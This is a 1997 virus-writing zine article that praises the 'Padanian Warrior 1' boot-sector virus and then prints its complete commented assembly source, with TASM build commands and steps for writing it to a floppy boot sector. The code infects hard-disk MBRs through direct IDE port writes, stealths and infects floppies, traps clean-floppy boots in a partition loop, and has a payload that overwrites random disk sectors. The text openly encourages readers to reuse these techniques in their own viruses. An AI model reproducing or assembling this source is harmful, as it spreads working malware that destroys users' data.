; comment *
;                      Virus spotlite:  Padanian Warrior 1
;                            by b0z0/iKx, Padania 1997
; 
; 
; Virus Name      : Padanian Warrior 1
; AV Name         : IntCE (AVP), Int_CE (F-Prot)
; Origin          : Padania
; Type            : Boot infector
; Lenght          : one sector
; 
; 
; Virus Description:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  This is a very cool boot virus that infects the MBR of the hard disk
; and infects any floppy disk that is accessed via DOS. This boot virus is
; extremely compact and implements a lot of interesting methods and tricks.
; The Padanian Warrior 1 in fact:
;         -> Doesn't allocate memory
;         -> Infects the MBR using ports
;         -> Makes booting from a floppy quite hard
;         -> Uses the 18_tech
;         -> Uses 386 instructions
;         -> Full stealth on MBR
;         -> Read stealth on floppy boot
;         -> Has a very cool method to activate the payload
;         -> Has a destructive payload
; 
;  Of course as you may suppose due to space restriction (hey, don't say "I may
; do that 25 bytes shorter" :) ) there are also some bad things in this virus,
; but these will be shown later.
;  Now let's examine deeper every aspect of this cool virus...
; 
; Virus residency:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  The virus uses a quite good way of going resident and doing his work. In fact
; the virus won't allocate as usually some memory but will rather copy itself
; into an unused part of the Interrupt Vector Table. Since 200h bytes may be too
; much and may cause some problems with the interrupts (since you may have to
; find a place with 80h unused ints) the virus will use just a little
; (3Ch bytes) part of the IVT. Here the virus will copy just the vital part of
; itself (this is the interrupt handler) that will provide when necessary to
; load the rest of the virus body.
; 
;  The virus will be copied always from 0:300 up to 0:33Ch. Another good trick
; that the virus uses is to use a piece of the copied part to call the original
; interrupt vector. In fact the virus will store the old interrupt vector in the
; dword at 0:338h. This of course will be used to chain the call to the original
; interrupt handler (doing a jmp far). But on the other side the dword at 0:338h
; is also the dword for the seg:off of the interrupt number 0CEh. So the virus
; instead of doing some space-consuming calls or something will just call the
; interrupt 0CEh when it will need to do a call to the original Int13h (AV
; name came just from this use of the 0CEh interrupt).
; 
;  As already mentioned the virus uses the 18_tech (look in Xine #2 for more
; explanations about this), so it won't issue any problem using windows and
; will be less AV-noticeable.
; 
; 
; Padanian Warrior interrupt handler:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  Since it uses 18_tech at first it needs to correct in some way the stack.
; Of course the VW decided to do the work simply with an add (instead of popping
; like a good school boy :) ) and this is also a good antitrace.
; 
;  The handler will check for reads or writes on the first sector of disks and
; floppyes. When one interesting call is encountered the virus will save 400h
; bytes from the user's buffer (this is from ES:BX) to a buffer on the hard
; disk (two sectors after the virus body on the disk). Then the virus will load
; its entire body in the user's buffer from the hard disk and will jump (push
; seg:off and do a retf) to the just readed infection/stealth part.
; 
;  If the user requested a write on the MBR the virus will just change the
; call to a disk reset, if a read on the MBR occours the virus will return
; the original MBR, if a write on a floppy occours the virus will just leave it
; to proceed and finally if a read on the floppy is requested the virus will
; infect it and then will stealth the read returning a normal DOS boot.
; 
;  Of course the data that is returned for the stealth is written on the
; previsiously mentioned hard disk buffer. Infact at the end of the work the
; virus will jump back to the virus body permanently in memory and will just
; reread to ES:BX the hard disk buffer (that may have been changed also by the
; stealth routines).
; 
; 
; MBR infection and new MBR manipulation:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  The MBR infection is done at the boot from an infected floppy disk. To
; determinate if the virus is already present on the hard disk it will check
; if the first partition starts at sector 1 (very common). If it starts
; somewhere else (because it is already infected or for some other user's
; reason) the virus quits the MBR infection routine.
; 
;  First of all the virus will save itself and the original MBR on two sectors
; starting from 0,0,5 (cyl,side,sector) on the hd. Then it will change the
; partition table of the 'new' MBR in this way:
; 
;                         ÖÄÄÄÄÒÄÄÄÄÄÄÒÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·
;                         º N. º TYPE º  Partition start º
;                         º    º      º   C  /  H  /  S  º
;                         ÇÄÄÄÄ×ÄÄÄÄÄÄ×ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
;                         º 1  º orig º   0  /  0  /  5  º
;                         º 2  º ext. º   0  /  0  /  4  º
;                         ÓÄÄÄÄĞÄÄÄÄÄÄĞÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½
; 
;  So the first entry (the orig in type means that it will just leave the same
; as it was before) will point to the virus body on the disk (so it will be
; loaded at each boot from that hard disk). The second partition will point to
; another modified MBR copy that the virus will put on the disk. In this second
; modified MBR (at 0,0,4) the virus will just leave one extended partition that
; will point to the same sector (this is to again to 0,0,4).
; 
;  So if the user will try to do a boot from a clean floppy disk DOS will go
; in an infinite loop looking for some other extended partition :) Of course
; if the virus is active the MBR stealth provides to give the saved good MBR
; when needed. Just some specific versions of DOS are able to boot from an
; infected PC.
; 
;  To avoid some BIOS virus protections the virus uses ports to write to the
; MBR. The routine to do this is incredibly short and efficent. It consist of
; a first part where the virus initializes the controller to the write (this
; is just a loop using a table for the initialization sequence) and then after
; a pause it will send the 200h bytes that must be written.
; 
; 
; Floppy infection and stealth:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  The virus won't save the original boot but it will just overwrite the
; original one with the virus body. It will preserve just the original serial
; number of the floppy. It won't even copy the BPB, but will just use the
; one from the first generation (that moved around with the virus :) ) that is
; part of the virus body. To see if the floppy is infected it will check the
; payload word (this is at 20h of the boot sector). If this is different than
; zero (set at formattation) then probably is already infected.
; 
;  As for stealth the virus will just give to the user a copy of the sector
; from the hard disk from 0,1,1 after coping the original BPB from the floppy
; disk to the right place. This stealth method counts on the fact that usually
; DOS is installed at 0,1,1 so there may be a good DOS boot sector to be used
; for stealth.
; 
; 
; Payload activation:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  Also the payload activation is intelligent (even if, in my opinion, the
; payload isn't). At every boot from the MBR the virus will decrement a payload
; counter by one (at virus installation this will be initialized to 78h) and
; when it will come to zero the payload will be activated. The real cool thing
; is that on every succesfull floppy disk infection the payload counter will be
; incremented by two, so on machines with a good traffic of floppyes (hehe, a
; good virus distro :) ) the payload may never activate. On the other side on
; closed machines that don't spread the virus the payload may activate faster.
; This is a good idea, since it may not be a good thing to activate the payload
; (and make anyone to understand that a virus is around by trashing all the
; data on the hard disk) on a PC where a lot of floppyes are moving everyday
; (for example in a PC shop, in a school or in an office), while an isolated
; machine that doesn't give any profit to the virus may be attacked.
; 
;  The payload is rather dummy: it will just go in an infinite loop where
; ranomly selected sectors (4 at once) are overwritten by some random data.
; 
; 
; Other goodies:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  As for other goodies I may mention that the virus uses also some 386
; instructions to make the code shorter and more efficent.
; 
;  The real virus name is "encrypted" at the end of the virus. To get the name
; you must UUENCODE the boot sector and you will see the name 8)))))
; 
; 
; Bad virus aspects:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  The virus has also some bad aspects. These aren't bugs or something like, but
; are things decided to make the code shorter. Padanian Warrior 1 infact relays
; to be on a system of a "normal" (say tipical if you want :) ) user. Infact for
; example it relays on the fact that a DOS partition is set on 0,1,1 , that all
; the diskettes (or quite all) have the same 1.44Mb format and that no other
; operating systems are used (since it doesn't save the original boot sector).
; 
;  But of course notice that IT FITS IN 448 bytes! So we can't pretend that it
; will make check of every possible O.S. or PC :) This "Bad virus aspects"
; section is only to give some ideas for future implementations and future
; viruses, not to say that the virus is bad! The virus relays on many settings
; and parameters from "normal" users, which are the real target of the virus
; (real users anyway aren't so lame to get infected... and don't use d0$ ;)) )
; and this is normal, since to make all the possible checks the virus may have
; to use the entire floppy :) So, in my personal opinion, the Padanian Warrior 1
; is effectively aimed to infect "normal" users and with those users it will
; work really very fine, so I suppose it may have a good chance to stay in
; the wild!
; 
; 
; Description conclusion:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;  This is undoubtely a VERY good boot virus. It has a lot of cool things and
; techs and all of this in just a sector. Expecially the port writing routine
; is great for its size and the payload activation method is undoubtely very
; interesting and may be interesting for payload activation for other viruses.
;  Well, I think that you may find many interesting tricks and implementations
; that may give your next boot virus a better look :)
; 
;  Greetings to the author of the Padanian Warrior 1! Hey, we all are already
; waiting for the second one 8))
; 
; 
; Virus disasm:
; ÍÍÍÍÍÍÍÍÍÍÍÍÍ
; And here finally we come to the virus disasm, enjoy!
; 
; To compile, use TASM 3.0 (at least to get the real first generation):
; 
; tasm /l /zi /m2 pdnwar.asm
; tlink /m /v pdnwar.obj
; tdstrip -c pdnwar.exe
; 
; the resulting 512 bytes file must be put on a floppy boot sector...
; *

.model tiny
.code
.386

; Some macros, so the source will be more clear and readable :)

; This second macro is to prevent TASM to optimize in his way the LEA
; generation... since we want the same code as in the original virus :)
lea_ok          MACRO   fromreg, segment, Imm16, refreg
                db      08dh
                ifidn   <fromreg>, <di>
                db      0bfh
                endif
                ifidn   <fromreg>, <DI>
                db      0bfh
                endif
                ifidn   <fromreg>, <si>
                db      0b7h
                endif
                ifidn   <fromreg>, <SI>
                db      0b7h
                endif
                dw      Imm16
ENDM

; This last macro is to prevent again a TASM optimization of add to a
; word in memory...
add_l           MACRO   weird, pitr, refreg, offset, drek, add_value
                db      83h
                db      87h
                dw      offset
                db      add_value
ENDM

; End of macros... finally the real virus code! :-)

                org     0

                jmp     short virus_start       ; Jump to virus body
                nop

;
; Here is placed the floppy data that will _always_ go around with the virus!
; This DBs are the first generation ones.
;

                db      04dh,053h,044h,04fh,053h,035h,02eh,030h
                db      000h,002h,001h,001h,000h,002h,0e0h,000h
                db      040h,00bh,0f0h,009h,000h,012h,000h,002h
                db      000h,000h,000h,000h,000h,078h,000h,000h
                db      000h,000h,000h,029h,000h,009h,042h,026h
                db      04eh,04fh,020h,04eh,041h,04dh,045h,020h
                db      020h,020h,020h,046h,041h,054h,031h,032h
                db      020h,020h,020h

                org     3eh

virus_start:
                push    cs
                pop     ss

                mov     sp,7c00h                ; Set SS:SP to 0:7C00h

                push    cs
                pop     es

                push    cs
                pop     ds                      ; CS = DS = ES = SS

                mov     si,(offset int18_handler + 7c00h)
                                                ; copy a part of virus body
                mov     di,300h                 ; in a piece of the IVT
                mov     cx,(offset orig_int13 - offset int18_handler)
                rep     movsb

                mov     si,4ch                  ; SI on orig int13h
                movsd                           ; save Seg:Off of int13h
                                                ; at the end of our piece
                                                ; of body (exactly at the
                                                ; place for int CEh)

                push    es                      ; save ES for later

                push    0f000h
                pop     es                      ; point ES to ROM

                xor     bx,bx

look_for_cd18:                                  ; 18_tech routine
                inc     bx
                cmp     word ptr es:[bx],18cdh  ; search the int 18h in ROM
                jne     look_for_cd18

                mov     si,04ch                 ; set the int 13h to point
                mov     word ptr [si],bx        ; to the CD18
                mov     word ptr [si+2],es

                mov     dword ptr [si+14h],300h ; new int18h handler is at
                                                ; 0:300h
                pop     es

                mov     ax,301h                 ; write a sector from disk
                mov     bx,sp                   ; from es:sp
                mov     cl,5                    ; points where the virus
                mov     dh,0                    ; resides on the hd

                cmp     dl,80h                  ; is the hd?
                jb      not_from_hd

                dec     word ptr ds:[7c20h]     ; payload counter
                jnz     no_activation

payload:
                in      al,40h
        xor ch,al
                in      al,40h                  ; get random offset in BX
                xor     cl,al                   ; and random sector/cylinder
                and     cl,1fh                  ; in CX
        mov bx,cx

                in      al,40h
                xor     dh,al                   ; get random head in DH
                and     dh,0fh

                mov     ax,304h                 ; write 4 sectors
                int     0ceh

                jmp     short payload


no_activation:
                int     0ceh                    ; rewrite the virus body
                                                ; in its place (counter
                                                ; decreased)

                mov     ax,201h                 ; read a sector
                mov     cl,1                    ; the MBR
                push    013cdh                  ; set an int13h on the
                                                ; top of the stack
                jmp     sp                      ; execute the pushed int13.
                                                ; this is reload the old
                                                ; mbr (using stealth) and
                                                ; then run it

not_from_hd:
                mov     word ptr ds:[7c20h],78h ; initialize the payload cntr

                mov     ah,2                    ; read one sector
                mov     bh,7eh                  ; to bx = 7E00h
                mov     cl,1                    ; read the MBR
                mov     dl,80h                  ; from disk
                int     0ceh                    ; do the real int13h

                cmp     byte ptr ds:[1bfh+bx],1 ; first partition starts at 1?
                jne     already_infected        ; no, so probably infected or
                                                ; infection may not be ok

                mov     ax,302h                 ; write two sectors
                mov     bh,7ch                  ; bx = 7c00h
                mov     cl,5                    ; save the virus body and
                                                ; the original mbr starting
                                                ; with sector 5
                int     0ceh                    ; do the real int13h


                mov     si,7fbeh                ; points to the original
                                                ; partition table
                mov     di,7fceh                ; where to save it
                mov     cl,10h
                rep     movsb                   ; copy the partition table
                                                ; 10h below the original
                                                ; position

                mov     word ptr ds:[3bfh+bx],0500h
                                                ; puts 05 as start of first
                                                ; partition in partition tbl

                mov     di,7fceh                ; modify the partition table
                xor     ax,ax                   ; so it will be quite hard to
                stosw                           ; boot without the virus in
                                                ; in memory :)
                mov     al,4
                stosw                           ; do virus second "partition"
        mov al,5
                stosb

                mov     si,(offset ide_prog + 7c00h)
                                                ; point to the init sequence

                mov     cl,7
                mov     dx,1f0h                 ; starting port - 1


; now the virus will initialize the controller, set the write mode etc...
; look at the ide_prog label for the details!

program_ide:
                inc     dx                      ; increase port
                outsb                           ; write DS:SI to port DX
                loop    program_ide


wait_loop:                                      ; wait a little for the ide
                loop    wait_loop

                mov     si,7e00h                ; point to the 'new' MBR
                mov     ch,1                    ; copy 200h bytes
                mov     dl,0f0h                 ; to port 1f0h
                rep     outsw                   ; write the modified MBR

                mov     si,7fceh                ; modify also the second
                mov     di,7fbeh                ; saved MBR that will be of
                mov     cl,10h                  ; use to confuse dos at a
                rep     movsb                   ; boot from a clean floppy

                mov     cl,30h                  ; delete the a second entry
                mov     al,0                    ; from partition table
                rep     stosb

                mov     ax,301h                 ; write the second mbr to hd
                mov     bh,7eh                  ; bx to the modified mbr
                mov     cl,4
        mov dx,80h
                int     0ceh                    ; do the real int13h

already_infected:
                int     19h                     ; reboot


; From this point the virus will be copied to 0:300h in memory and will stay
; always there...

int18_handler:
                add     sp,6                    ; correct stack since the
                                                ; virus uses 18_tech

                cmp     ah,2                    ; reading?
                jb      leave_call

                cmp     ah,3                    ; writing?
                ja      leave_call

                cmp     cx,1                    ; on boot/mbr ?
                jne     leave_call

                cmp     dx,80h                  ; on floppy or hd?
                ja      leave_call

                pusha

                mov     ax,302h                 ; save 1024 bytes from
                mov     cl,7                    ; the buffer ES:BX on a
                mov     dl,80h                  ; buffer on the HD
                int     13h

                mov     ax,201h                 ; read the entire virus
                mov     cl,5                    ; from the HD to ES:BX
                int     13h

                add     bx,offset infect_ste    ; jump to the infection
                push    es                      ; routine (we just readed
                push    bx                      ; it from the disk)
                retf

returning:
                int     13h

                popa
        popf                ; Pop flags
        retf    2           ; Return far
leave_call:

                db      0eah
orig_int13      dd       00h                    ; original seg:off of int13h
                                                ; int CEh will point on this
                                                ; doubleword

; here is the end of the part of the virus that is always in memory (starting
; from 0:300h up to 0:33Ch)

                org     $-4                     ; The next four bytes (as
                                                ; you notice by the org :) )
                                                ; are overwritten in memory
                                                ; by the int13h seg:off, but
                                                ; are always present on the
                                                ; disk. Infact the infection
                                                ; routine is present in mem
                                                ; just when needed...
infect_ste:
                popa                            ; reload calling regs

                mov     al,01h

                cmp     dl,80h                  ; is on the HD ?
                jb      floppy_disk

                cmp     ah,03h                  ; writing on the MBR ??? :)
                je      you_wont

                pusha                           ; it seems they are going
                                                ; to read it...
                add     bh,2
                mov     cl,6                    ; read the saved one from HD
                int     13h

                mov     ax,301h
                mov     cl,7                    ; save it on our disk buffer
                int     13h

                popa

you_wont:
                clc
                xor     ax,ax                   ; zero AX
                jmp     short exit_infect

floppy_disk:
                cmp     ah,2                    ; are they reading?
                je      reading_it

                int     0ceh                    ; well, leave the sucker
                                                ; to write and exit
                jmp     short exit_infect

reading_it:
        push    bx
                add     bh,2                    ; read it in our mem buffer
                int     0ceh                    ; (this is ES:[BX+200h])
                pop     bx

                jc      exit_infect             ; exit on error

                cld
                pusha

                lea     si,ds:[0227h + bx]      ; point to the serial num
                lea_ok  di,ds:[ 027h + bx]      ; point to the dest serial num

                segcs   movsd                   ; copy the serial number

                cmp     word ptr es:[220h+bx],0 ; this place is usually at
                                                ; floppy formatation 00h, so
                                                ; if it != 00h then maybe it
                                                ; is already infected and it
                                                ; may contain a payload cntr
                jne     no_bonus

                mov     ax,301h                 ; write virus to floppy disk
                int     0CEh
                jc      no_bonus                ; error? if so no bonus!

                add_l   word ptr [bx+ 20h ],02h ; add 2 to our payload counter

                mov     ax,301h                 ; rewrite the virus body
                mov     cl,5                    ; to its usual place, but
                mov     dl,80h                  ; with the different counter
                int     13h

no_bonus:
                mov     ax,201h                 ; read the dos boot sector
                add     bh,2                    ; that is very probably
                mov     cl,1                    ; here. this is a good
                mov     dx,180h                 ; "normal" boot sector
                int     13h

                lea     si,ds:[bx-200h+03h]     ; point to our space for
                                                ; the bpb
                lea_ok  di,ds:[ 03h + bx]       ; point to the dos boot
                                                ; space of the bpb

                mov     cl,3bh                  ; how many bytes we need

                segcs   rep movsb               ; move our (floppy) bpb to
                                                ; it's place.

                mov     ax,301h                 ; write it to the buffer
                mov     cl,7                    ; on the disk... this is
                mov     dh,0                    ; what will be returned
                int     13h                     ; also to the user
                                                ; this is floppy bs stealth
                popa

exit_infect:
                pushf
                pusha
                mov     ax,202h                 ; read the two sectors from
                mov     cl,7                    ; our temp disk buffer to
                mov     dl,80h                  ; his buffer in ES:BX

                db      0eah                    ; jmp far
                dw      330h                    ; adress of returning
                dw       00h                    ; the segment where the virus
                                                ; resides is always 00h
; ide programming sequence
                org     $-1                     ; one byte for ide programming
                                                ; is used directly from the
                                                ; absolute jump before
ide_prog:
                                ; ÚÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                                ; ³ Port ³     Effect                     ³
                                ; ÃÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
                db      000h    ; ³ 1F1h ³   Set Precompensation to 0     ³
                db      001h    ; ³ 1F2h ³   Set Sector count    to 1     ³
                db      001h    ; ³ 1F3h ³   Set Sector number   to 1     ³
                db      000h    ; ³ 1F4h ³   Set Cylinder high   to 0     ³
                db      000h    ; ³ 1F5h ³   Set Cylinder low    to 0     ³
                db      0A0h    ; ³ 1F6h ³   Set Drive to  0,  Head 0     ³
                db      030h    ; ³ 1F7h ³   Set Write sector             ³
                                ; ÀÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

; name_stuff are bytes used for the virus name
name_stuff:
                db      070h,086h,048h,06Eh,0A6h,01Bh,0B7h,087h
                db      02ch,0A9h,0BFh,024h,041h

                org     01feh
boot_marker     db      55h,0AAh
                org     200h

                end
